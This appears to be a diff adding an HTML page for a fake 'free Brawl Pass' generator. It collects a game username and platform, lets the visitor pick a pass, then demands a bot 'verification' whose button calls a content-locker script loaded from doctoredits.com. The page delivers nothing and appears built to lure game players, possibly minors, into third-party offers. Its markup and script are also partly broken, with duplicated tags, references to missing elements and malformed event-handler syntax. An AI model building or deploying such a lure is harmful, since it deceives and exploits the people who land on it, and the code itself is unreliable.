@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Choice Generator</title>
+    <style>
+        @font-face {
+    font-family: 'C-Light';
+    src: url('ClarikaGrotesque-Light.woff2') format('woff2'),
+        url('ClarikaGrotesque-Light.woff') format('woff');
+    font-weight: 300;
+    font-style: normal;
+}
+img {
+  display: block;
+  width: 50%;
+  margin: auto;
+}
+        body {
+            font-family: "C-Light";
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://pbs.twimg.com/media/F2GtWdnWAAAb6Hw.jpg:large');
+            background-size: cover;
+            background-position: center;
+            color: white;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 500px;
+            max-height: 76%;
+
+        }
+        .container2 {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 40px;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 500px;
+            max-height: 90%;
+        }
+        .page {
+            display: none;
+        }
+        .active {
+            display: block;
+        }
+        h1 {
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .input-container {
+            background-color: white;
+            padding: 10px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            border-radius: 5px;
+        }
+        input {
+            border: none;
+            outline: none;
+            font-size: 18px;
+            width: 100%;
+            background: transparent;
+        }
+        .platform-container, .pass-container {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 30px;
+        }
+        .platform-icon {
+            background-color: white;
+            padding: 15px;
+            width: 80px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+        .pass-button {
+            background-color: white;
+            padding: 15px;
+            width: 100px;
+            height: 200px;
+            display: grid;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+        .platform-icon img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+        .platform-icon.selected, .pass-button.selected {
+            background-color: #ffd700;
+            transform: scale(1.1);
+        }
+        .next-button {
+            background-color: #ffd700;
+            color: black;
+            padding: 15px 30px;
+            font-size: 18px;
+            text-transform: uppercase;
+            border: none;
+            cursor: pointer;
+            clip-path: polygon(0 0, 100% 0, 95% 100%, 0% 100%);
+            display: block;
+            margin: 0 auto;
+            transition: all 0.3s ease;
+        }
+        .VerifyButton {
+            background-color: #ffd700;
+            color: black;
+            padding: 15px 30px;
+            font-size: 18px;
+            text-transform: uppercase;
+            border: none;
+            cursor: pointer;
+            clip-path: polygon(0 0, 100% 0, 95% 100%, 0% 100%);
+            display: block;
+            margin: 0 auto;
+            transition: all 0.3s ease;
+        }
+        .VerifyButton:hover {
+            background-color: #ffed4d;
+            transform: scale(1.05);
+        }
+        .next-button:hover {
+            background-color: #ffed4d;
+            transform: scale(1.05);
+        }
+        .pass-button {
+            width: 150px;
+            height: 150px;
+            font-size: 23px;
+            font-weight: bold;
+            color: black;
+            text-align: center;
+        }
+        .pass-button img{
+            width: 80%;
+            height: auto;
+        }
+        #loading {
+            text-align: center;
+            font-size: 24px;
+        }
+        #finalPage {
+            text-align: center;
+        }
+        #verifyButton {
+            margin-top: 20px;
+        }
+        .hidden {
+        display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+    </style>
+</head>
+<body>
+    <div class="container2">
+        <img src="img/logo.png" class="w-75 img-fluid mx-auto" >
+        <div id="page1" class="page active">
+            <h1>Username</h1>
+            <div class="input-container">
+                <input type="text" id="username" placeholder="Enter your username">
+            </div>
+            <h1>Platform</h1>
+            <div class="platform-container">
+                <div class="platform-icon" id="android">
+                    <img src="https://koamtac.com/wp-content/uploads/android_logo-768x768.png" alt="Android">
+                </div>
+                <div class="platform-icon" id="ios">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/625px-Apple_logo_black.svg.png" alt="iOS">
+                </div>
+            </div>
+            <button class="next-button" id="nextButton">Next</button>
+        </div>
+        <div id="page2" class="page">
+            <h1>Choose Your Pass</h1>
+            <div class="pass-container">
+                <div class="pass-button" id="Pass">Brawl Pass +
+                    <img src="img/Brawl_pass_plus.png" alt="Pass" >
+                </div>
+                <div class="pass-button" id="PassPremium">Brawl Pass
+                    <img src="img/Brawl_Pass.webp" alt="PassPremium">
+                </div>
+            </div>
+            <button class="next-button" id="submitButton">Submit</button>
+        </div>
+    </div>
+    <div id="finalPage" class="page">
+        <h1 id="TitreFinale">Last Step:</h1>
+        <h3>We need to verify that you're not a bot in order to send you the Pass </h3>
+        <img src="img/LOGO_warning.png">
+
+        <button class="VerifyButton" id="verifyButtonDelay" onclick="call_locker();">Verify</button>
+        <script type="text/javascript" src="https://doctoredits.com/script_include.php?id=1712932"></script>
+    </div>
+
+
+    <script>
+        let selectedPlatform = null;
+        let selectedPass = null;
+
+        document.querySelectorAll('.platform-icon').forEach(icon => {
+            icon.addEventListener('click', function() {
+                document.querySelectorAll('.platform-icon').forEach(i => i.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedPlatform = this.id;
+            });
+        });
+
+        document.querySelectorAll('.pass-button').forEach(button => {
+            button.addEventListener('click', function() {
+                document.querySelectorAll('.pass-button').forEach(b => b.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedPass = this.id;
+            });
+        });
+
+        document.getElementById('nextButton').addEventListener('click', function() {
+            const username = document.getElementById('username').value;
+            if (!username || !selectedPlatform) {
+                alert('Please enter a username and select a platform');
+                return;
+            }
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.add('active');
+        });
+
+        document.getElementById('submitButton').addEventListener('click', function() {
+            if (!selectedPass) {
+                alert('Please select a pass');
+                return;
+            }
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('finalPage').classList.add('active');
+            document.getElementById('finalUsername').textContent = document.getElementById('username').value;
+        }
+
+        ,document.getElementById('verifyButtonDelay').addEventListener('click', function() {
+            document.getElementById('finalPage').classList.remove('active');
+            document.getElementById('PageLocker').classList.add('active');
+
+
+
+            // You can add more game-ending logic here
+        }
+    ));
+    </script>
+</body>
+</html>
